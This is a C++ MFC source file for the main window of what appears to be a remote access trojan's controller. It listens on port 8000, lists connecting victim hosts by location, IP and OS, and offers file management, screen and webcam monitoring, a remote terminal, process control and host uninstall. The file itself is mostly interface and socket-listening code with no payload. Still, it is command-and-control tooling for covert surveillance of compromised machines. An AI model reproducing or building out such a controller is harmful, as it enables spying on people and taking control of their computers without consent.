
// MingZzDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "MingZz.h"
#include "MingZzDlg.h"
#include "afxdialogex.h"
#include "resource.h"
#include "ItemData.h"
#include "Conmmon.h"
#include <MMSystem.h>
#pragma comment(lib, "Winmm.lib")

#ifdef _DEBUG
#define new DEBUG_NEW
#endif





// CMingZzDlg 对话框




CMingZzDlg::CMingZzDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CMingZzDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMingZzDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST, m_list);
}

BEGIN_MESSAGE_MAP(CMingZzDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_CLOSE()
	ON_MESSAGE(ID_ONLINE, OnAddHost)
	ON_MESSAGE(ID_OFFLINE, OnOffLine)
	ON_COMMAND(ID_FILE_MANAGER,OnFileManager)
END_MESSAGE_MAP()


// CMingZzDlg 消息处理程序

BOOL CMingZzDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	this->m_max = 1000;
	this->m_port = 8000;
	this->m_Sound = 0;
	UpdateMain(8000);
	::CloseHandle(CreateThread(0,0,OninitSocket,(LPVOID)this,0,0)); //运行线程

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CMingZzDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CMingZzDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CMingZzDlg::UpdateMain(int port)
{
    m_imagelist.Create(32,32,ILC_COLOR24|ILC_MASK,1,1);//位图列表创建
    CBitmap bmp;// 创建一个位图的对象
    for(int i=0;i<8;i++)
    {
        bmp.LoadBitmapW(IDB_BITMAP1+i);//导入位图
        m_imagelist.Add(&bmp,RGB(255,255,255));//添加到列表
        bmp.DeleteObject();// 删除，释放资源
    }
	/*
    m_bmp[0].LoadBitmap(IDB_MENU_EXIT);
    m_bmp[1].LoadBitmap(IDB_MENU_SETTING);
    m_bmp[2].LoadBitmap(IDB_MENU_ABOUT);

    m_subbmp[0].LoadBitmapW(IDB_MENU_AGENT);
    m_subbmp[1].LoadBitmapW(IDB_MENU_SHUTDOWN);
    m_subbmp[2].LoadBitmapW(IDB_MENU_RESTART);
    m_subbmp[3].LoadBitmapW(IDB_MENU_UPDATE);
    m_subbmp[4].LoadBitmapW(IDB_MENU_HTTP);
    m_subbmp[5].LoadBitmapW(IDB_MENU_RUN);
	*/
	/*
    GetMenu()->GetSubMenu(0)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[0], &m_bmp[0]);
    GetMenu()->GetSubMenu(1)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[1], &m_bmp[1]);
    GetMenu()->GetSubMenu(2)->SetMenuItemBitmaps(0,MF_BYPOSITION, &m_bmp[2], &m_bmp[2]);
	*/
    const UINT t[9] = {1001,1002,1003,1004,1005,1006,0,1007,1008};// 9个，按钮的ID
	m_toolbar.CreateEx(this);// 创建工具条
    m_toolbar.SetButtons(t,9);// 设置按钮  ID数组，ID数量
    m_toolbar.SetSizes(CSize(60,56),CSize(24,24));// 尺寸设置  按钮大小，图标大小
    m_toolbar.SetButtonText(0,_T("文件管理"));// 图标的文本信息
    m_toolbar.SetButtonText(1,_T("屏幕监控"));
    m_toolbar.SetButtonText(2,_T("超级终端"));
    m_toolbar.SetButtonText(3,_T("进程管理"));
    m_toolbar.SetButtonText(4,_T("视频监控"));
    m_toolbar.SetButtonText(5,_T("卸载主机"));
    m_toolbar.SetButtonText(7,_T("程序设置"));
    m_toolbar.SetButtonText(8,_T("关于软件"));
    m_toolbar.GetToolBarCtrl().SetImageList(&m_imagelist);// 关联图标列表

    BOOL hbar = m_statusbar.Create(this);// 创建状态栏
    UINT b[2]={1009,1010};// 2栏
    hbar = m_statusbar.SetIndicators(b,2);// 数组， 数目
    m_statusbar.SetPaneInfo(0,b[0],SBPS_NORMAL,400);// 一些设置
    m_statusbar.SetPaneInfo(1,b[1],SBPS_NORMAL,180);
    CString ListenPort; // 
    ListenPort.Format(_T("监听端口：%d"),port);
    m_statusbar.SetPaneText(0,ListenPort);// 设置文本
    m_statusbar.SetPaneText(1,_T("在线主机：0 台"));
    RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);// 重设
	/*
    m_mainicon.Create(16,16,ILC_COLOR24|ILC_MASK,1,0);
    m_mainicon.Add(LoadIcon(AfxGetResourceHandle(),MAKEINTRESOURCE(IDI_USER)));
    m_mainicon.Add(LoadIcon(AfxGetResourceHandle(),MAKEINTRESOURCE(IDI_CAM)));
    m_list.SetImageList(&m_mainicon,LVSIL_SMALL);
	*/

    m_list.SetExtendedStyle(LVS_EX_FULLROWSELECT|LVS_EX_GRIDLINES|LVS_EX_CHECKBOXES);// 列表框风格设置
    m_list.InsertColumn(0,_T("地理位置"),LVCFMT_LEFT,160);// 插入列
    m_list.InsertColumn(1,_T("IP地址"),LVCFMT_LEFT,110);
    m_list.InsertColumn(2,_T("操作系统"),LVCFMT_LEFT,90);
    m_list.InsertColumn(3,_T("代理状态"),LVCFMT_LEFT,60);
    m_list.InsertColumn(4,_T("服务端版本号"),LVCFMT_LEFT,100);

    GetClientRect(&m_rect);// 获取客户区矩形大小
}


BOOL CMingZzDlg::PreTranslateMessage(MSG* pMsg)// 程序传入的消息，
{// 重载函数，用于消除回车键和ESC键退出程序的尴尬
	// TODO: 在此添加专用代码和/或调用基类
	if(pMsg->message == WM_KEYDOWN)// 按键消息
	{
		int nVirtKey = (int)pMsg->wParam;
		if(nVirtKey == VK_RETURN || nVirtKey == VK_ESCAPE)// 回车键  || ESC键
		{
			return TRUE;
		}
	}

	return CDialogEx::PreTranslateMessage(pMsg);
}


void CMingZzDlg::OnSize(UINT nType, int cx, int cy)
{// 当窗体大小变化时触发此消息

	//CDialogEx::OnSize(nType, cx, cy);

	// TODO: 在此处添加消息处理程序代码
	CDialog::OnSize(nType, cx, cy);
    if(nType == SIZE_MINIMIZED)// 最小化
    {
        return;
    }
    // TODO: 在此处添加消息处理程序代码
    CWnd *pWnd;// 窗口类指针
    pWnd = GetDlgItem(IDC_LIST);     //获取控件句柄
    if(pWnd)//判断是否为空，因为对话框创建时会调用此函数，而当时控件还未创建
    {
        CRect rect,rect_l;   //获取控件变化前大小
        GetClientRect(&rect_l);// 获取没变化之前的大小
        pWnd->GetWindowRect(&rect);// 控件矩形
        ScreenToClient(&rect);
        rect.right = cx;// 右边 = 窗口的右边
        rect.bottom= rect.bottom + (rect_l.bottom - m_rect.bottom);// 高度的变化
        pWnd->MoveWindow(rect);//设置控件大小
        RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);// 更新一下状态栏
    }
    /*
    else
    {
        delete pWnd;
    }
    */
    GetClientRect(&m_rect);// 再次获取一下窗口的矩形
}

bool CMingZzDlg::InitSocket() //初始化SOCKET
{
    WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2), &WSAData);
	SOCKADDR_IN saddr;

    s=::socket(AF_INET,SOCK_STREAM,0);
	if(s==SOCKET_ERROR)
	{
		MessageBox(_T("创建连接失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}
	
	saddr.sin_family=AF_INET;
	saddr.sin_addr.S_un.S_addr=INADDR_ANY;
	saddr.sin_port=htons(m_port);
	
	int nRet;
    nRet=::bind(s,(SOCKADDR *)&saddr,sizeof(saddr));
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("绑定端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}

	nRet=listen(s,m_max);
	if(nRet == SOCKET_ERROR)
	{
		MessageBox(_T("监听端口失败"),_T("提示"),MB_OK|MB_ICONWARNING);
        return false;
	}

	while(1)
	{
		SOCKET SerSock;
		SOCKADDR_IN Seraddr;
		int Seraddrsize=sizeof(Seraddr);
		
		SerSock = accept(s,(sockaddr *)&Seraddr,&Seraddrsize);
		if (SerSock == INVALID_SOCKET)
        {
			continue;
        }
        AddHost(SerSock,Seraddr);
	}
    return true;
}

DWORD WINAPI CMingZzDlg::OninitSocket(LPVOID self) //初始化Socket线程
{
    CMingZzDlg* t = (CMingZzDlg*)self;
    t->InitSocket();
    return 0;
}

void CMingZzDlg::AddHost(SOCKET sock,SOCKADDR_IN addr) //添加主机函数
{
    GetNewItemData(sock,addr);
    return;
}

void CMingZzDlg::GetNewItemData(SOCKET sock,SOCKADDR_IN addr) //获取新的条目数据
{
    CItemData *item;
    int id;
    int Count = m_list.GetItemCount();
    if(Count == 0)
    {
        id = 0;
    }
    else
    {
        id = 0;
        for(int i=0;i<Count;i++)
        {
            item = (CItemData*)m_list.GetItemData(i);
            if(item->m_id == id)
            {
                i = 0;
                id = id + 1;
                continue;
            }
        }
    }
    item = NULL;
    item = new CItemData(id,sock,&addr,this->m_hWnd);
    item->Run();
}

void CMingZzDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	int t = MessageBoxW(_T("确定要退出程序吗？"),_T("提示"),MB_YESNO|MB_ICONINFORMATION);
    if(t == IDYES)
    {
        //CloseAllSocket();
        ::closesocket(s);
        m_Mysock.Clean();
    }
    else
    {
        return;
    }
    CDialog::OnClose();
}


LRESULT CMingZzDlg::OnAddHost(WPARAM wparam, LPARAM lparam) // 主机上线消息体
{
	CItemData *t = (CItemData*) wparam;
	int i = m_list.GetItemCount();
	m_list.InsertItem(i, t->m_Address, 0);
	m_list.SetItemText(i, 1, t->m_IP);
	m_list.SetItemText(i, 2, t->m_OS);
	m_list.SetItemText(i, 3, _T("未开启"));
	m_list.SetItemText(i, 4, t->m_Ver);
	m_list.SetItemData(i, (DWORD)t);
	ShowOnLine();
	if(m_Sound == 1)
	{
		PlaySoundW(_T("Sound\\online.wav"), 0, SND_FILENAME|SND_ASYNC);
	}
	return 0;
}

LRESULT CMingZzDlg::OnOffLine(WPARAM wparam, LPARAM lparam) // 主机下线消息体
{
	CItemData * t;
	for(int i = 0; i < m_list.GetItemCount(); i++)
	{
		t = (CItemData*)m_list.GetItemData(i);
		if(t->m_id == (int)wparam)
		{
			::closesocket(t->GetSocket());
			delete t;
			m_list.DeleteItem(i);
		}
	}
	ShowOnLine();
	if(1 == m_Sound)
	{
		PlaySoundW(_T("Sound\\offline.wav"), 0, SND_FILENAME|SND_ASYNC);
	}
	return 0;
}

void CMingZzDlg::ShowOnLine() // 设置在线主机   状态栏
{
	int c = m_list.GetItemCount();
	CString online;
	TCHAR * szText;
	online.Format(_T("在线主机：%d 台"), c);
	szText = online.GetBuffer(online.GetLength());
	::SendMessageW(m_statusbar, SB_SETTEXTW, (WPARAM)1, (LPARAM)szText);
	online.ReleaseBuffer();
}

void CMingZzDlg::OnFileManager()
{
    CItemData *t;
    t = GetSelItemInfo();// 得到当前选中的项
    if(t == NULL)
    {
        return;
    }
    else
    {
        t->RunToFileManager();
    }
}

CItemData* CMingZzDlg::GetSelItemInfo()
{
    POSITION pos_s;
    pos_s=m_list.GetFirstSelectedItemPosition();
    if(!pos_s)
    {
	    return NULL;
    }
    int item=m_list.GetNextSelectedItem(pos_s);
    CItemData *t;
    t = (CItemData*)m_list.GetItemData(item);
    return t;
}